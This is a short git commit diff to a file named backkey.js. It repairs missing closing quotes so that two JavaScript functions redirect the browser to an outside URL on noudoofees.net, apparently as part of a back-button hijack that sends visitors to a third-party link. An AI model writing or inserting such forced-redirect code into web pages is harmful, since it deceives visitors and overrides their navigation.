87b0de1155bbcabcdc620f12fe3523048e4a2d15
uptomars <Kenoly555+me@gmail.com>
2025-04-17 12:51:22 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -4,8 +4,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://noudoofees.net/4/9148867;
+        location.href="https://noudoofees.net/4/9148867";
     }
     function goon(){
-        location.href="https://noudoofees.net/4/9148867;
+        location.href="https://noudoofees.net/4/9148867";
     }
